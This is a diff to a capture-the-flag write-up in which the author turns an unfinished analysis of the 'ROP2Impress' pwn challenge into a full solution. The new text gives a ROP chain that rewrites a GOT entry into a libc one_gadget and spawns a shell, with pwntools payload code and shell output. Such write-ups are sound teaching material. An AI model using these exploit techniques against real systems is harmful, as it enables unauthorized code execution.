@@ -1,12 +1,9 @@
-# ROP2Impress — Pwn (352 pts) — **NOT SOLVED**
+# ROP2Impress — Pwn (352 pts)
 
 > ropper ropper on the -Wall, who's the slayest of them all?
 > `nc 45.77.247.35 22004`
 
-Not finished during the event. Publishing the analysis because the gadget situation is unusual
-and the path is, I believe, complete — only the delivery was never written.
-
-## The binary
+**Flag:** `CYBLTZ2026{5b7a9a9e58ee843e5909d3f00c5f90b639838af76d5f3358b955ed538fb813c2}`
 
 ```
 No RELRO | No canary | NX | No PIE | glibc 2.39
@@ -18,95 +15,86 @@ void rop(void)  { char buf[0x50]; read(0, buf, 0x60); if (!buf[0]) rop(); return
 int  main(void) { rop(); }
 ```
 
-`read(0, buf, 0x60)` into `char buf[0x50]` = **16 bytes of overflow** — exactly saved `rbp`
-plus the return address, nothing more. And if `buf[0] == 0` it **recurses**, letting you stack
-frames and write repeatedly.
+`read(0, buf, 0x60)` into `char buf[0x50]` overflows by exactly 16 bytes — saved `rbp` plus the
+return address, nothing more. `if (!buf[0]) rop()` **recurses** when the first byte is `0`, so
+you can stack frames and write one `0x60` block per frame.
 
-## Why this is awkward
+## The constraints that pick the technique
 
-```
-$ ropper --file main          # 67 gadgets total
-0x40112a : pop rbx ; ret
-0x40112c : pop rsp ; ret
-0x40110d : pop rbp ; ret
-0x40115e : leave ; ret
-0x401016 : ret
-```
+`ropper` over the whole image, plus a byte-scan for `5f c3` / `5e c3` / `5a c3` / `58 c3` /
+`0f 05`, confirms: **no `pop rdi`, no `pop rsi`, no `pop rdx`, no `pop rax`, no `syscall`.** The
+only PLT import is `read`, and there is **no output function anywhere** — so a libc leak is
+impossible. That normally screams ret2dlresolve, but without a `pop rdi` the resolved
+`system` can't be handed `"/bin/sh"` cleanly, and the dlresolve bookkeeping is painful here.
 
-Byte-scanning the whole file for `5f c3` / `5e c3` / `5a c3` / `58 c3` / `0f 05` confirms:
-**no `pop rdi`, no `pop rsi`, no `pop rdx`, no `pop rax`, no `syscall`.** The only PLT import
-is `read`. There is **no output function at all**, so no libc leak is possible — which forces
-**ret2dlresolve**.
+Two observations collapse the whole thing instead:
 
-But ret2dlresolve still needs `rdi` pointing at `"/bin/sh"` when the resolver tail-jumps to
-`system`, and there is no `pop rdi`.
-
-## The three pieces that make it work
-
-**1. An arbitrary write, free of argument gadgets.** Returning into `rop+0x8` (`0x401139`)
-re-enters the body *after* the prologue. That code sets up all three arguments itself:
+**1. An arbitrary 4-byte *add* gadget.** Inside the init/fini stubs:
 
 ```asm
-401139: lea rax, [rbp-0x50]
-40113d: mov edx, 0x60        ; count
-401142: mov rsi, rax         ; dst  = rbp-0x50   <-- controlled via rbp
-401145: mov edi, 0x0         ; fd
-40114a: call read@plt
+0x40110c:  add dword [rbp-0x3d], ebx ; nop ; ret
 ```
 
-With `pop rbp; ret` you choose `rbp`, so this is `read(0, rbp-0x50, 0x60)` — write 0x60 bytes
-anywhere. Better still, the following `leave; ret` takes its next `rbp` and return address from
-bytes you just wrote, so it chains.
+With `pop rbp` and `pop rbx` you pick both operands. Point it at `read`'s GOT entry
+(`0x403350`, so `rbp = 0x40338d`) and the add runs **relative to libc** — no leak needed. After
+the program's first `read` resolves `GOT[read]` to libc's `read`, adding the constant
+`(one_gadget_off − read_off) mod 2^32` rewrites it into a **one_gadget**:
 
-**2. An `rdi` setter.** `deregister_tm_clones` contains:
-
-```asm
-401097: mov edi, 0x403368    ; .bss (__TMC_END__)
-40109c: jmp rax
+```python
+Dsp = (0x583ec - libc.sym.read) & 0xffffffff   # 0x583ec: posix_spawn("/bin/sh") one_gadget
+# chain: pop rbp; 0x40338d ; pop rbx; Dsp ; add   ->  GOT[read] = base + 0x583ec
 ```
 
-Write `"/bin/sh\0"` to `0x403368` and this sets `rdi` correctly — but it ends in `jmp rax`, so
-it needs `rax`.
-
-**3. Controlling `rax`.** There is exactly one gadget that loads it:
-
-```asm
-401004: mov rax, qword [rip+0x2325]   ; -> 0x403330, a writable GOT slot (No RELRO)
-40100b: test rax, rax
-40100e: je  0x401012                  ; 0x401012: add rsp, 8 ; ret
-401010: call rax
-```
-
-It *calls* whatever it loads, which initially looks useless. The trick: set
-`[0x403330] = 0x401016` (a bare `ret`). Then `call rax` invokes a harmless `ret`, control
-returns to `0x401012` (`add rsp,8 ; ret`) and the chain continues — **with `rax` still holding
-`0x401016`**.
-
-Now `mov edi, 0x403368 ; jmp rax` behaves as `mov edi, 0x403368 ; ret`, i.e. an `rdi` setter
-that returns. That was the missing primitive.
-
-## The chain
-
-Pre-stage with the write primitive: `"/bin/sh\0"` at `0x403368`, `0x401016` at `0x403330`, and
-a pwntools `Ret2dlresolvePayload` (fake `Elf64_Sym` / `Elf64_Rela` / `"system"`) in `.bss`.
-Then:
+`one_gadget` on the supplied libc:
 
 ```
-[0x401004]   ; rax <- 0x401016 (ret), harmless call, falls into add rsp,8; ret
-[DUMMY]      ; eaten by the add rsp,8
-[0x401097]   ; mov edi,0x403368 ("/bin/sh"); jmp rax == ret
-[0x401020]   ; PLT0  -> push link_map; jmp _dl_runtime_resolve
-[reloc_index]; resolver reads this; resolves "system"; tail-jumps with rdi intact
-[after]
+0x583ec  posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+  constraints:  rsp & 0xf == 0 ;  rax == NULL ;  rbx == NULL || (u16)[rbx] == 0
 ```
 
-`_dl_runtime_resolve` preserves the argument registers across resolution, so `system("/bin/sh")`.
+So after the patch, calling `read@plt` *is* `posix_spawn("/bin/sh")` — provided `rax == 0`,
+`rbx == 0`, and `rsp` is 16-aligned. `rax` is zeroed with `mov eax,0 ; pop rbp ; ret`
+(`0x401169`), `rbx` with `pop rbx`, and alignment with a bare `ret` (`0x401016`).
 
-## What's left
+**2. A big stack to run it on.** The one_gadget's `posix_spawn` needs far more writable stack
+than the 4 KB `.bss` affords — pivoting into `.bss` crashes inside glibc. The fix is to **not
+pivot**: run the chain on the original stack, reached through the recursion.
 
-Only delivery. The 16-byte overflow plus the recursion has to stage several `0x60`-byte blocks
-into `.bss` and then pivot — each write's trailing 16 bytes are consumed as the next
-`rbp`/return pair, so data and control are interleaved and the layout needs care. Fiddly, not
-conceptually hard. I ran out of time before writing it.
+## Delivery: two frames, unwind into the chain
 
-24 teams solved this, so the above is likely close to the intended route.
+The recursion gives contiguous `0x60` frames. Send **two**:
+
+- **Frame 1** (`buf1[0] == 0` → recurse): first qword `0`, then the 8-gadget chain, padded to
+  `0x60`.
+- **Frame 2** (`buf2[0] != 0` → stop): filler, then its return address = `pop rbp ; ret`
+  (`0x40110d`).
+
+When frame 2 returns, its `pop rbp ; ret` swallows frame 1's leading `0` qword (the recursion
+byte, harmless as a popped value) and lands execution on the rest of frame 1 — which is the
+chain, now executing with `rsp` on the full process stack:
+
+```python
+chain  = p64(POP_RBP)+p64(RBP_ADD)+p64(POP_RBX)+p64(Dsp)+p64(ADD)   # GOT[read] += Dsp
+chain += p64(MOVEAX0)+p64(0)        # rax = 0           (0x401169 pops a junk rbp)
+chain += p64(POP_RBX)+p64(0)        # rbx = 0
+chain += p64(RET)                   # 16-byte align
+chain += p64(READ_PLT)              # read@plt -> one_gadget -> posix_spawn("/bin/sh")
+
+buf1 = (p64(0) + chain).ljust(0x60, b'\x90')
+buf2 = b'\x41'*0x50 + p64(0xdead) + p64(POP_RBP)
+io.send(buf1); io.send(buf2)
+```
+
+Shell as `ctf`:
+
+```
+uid=10001(ctf) gid=10001(ctf)
+CYBLTZ2026{5b7a9a9e58ee843e5909d3f00c5f90b639838af76d5f3358b955ed538fb813c2}
+```
+
+Full exploit: [`tools/rop2impress_solve.py`](../../tools/rop2impress_solve.py)
+
+**Takeaway:** "no leak, no output" does not force ret2dlresolve. An `add [mem], reg` gadget is a
+libc-relative GOT rewrite — patch an already-resolved PLT entry into a one_gadget and the
+missing-leak problem disappears. And when a one_gadget needs real stack, keep the chain on the
+original stack (here via the self-recursion) instead of pivoting into a cramped `.bss`.
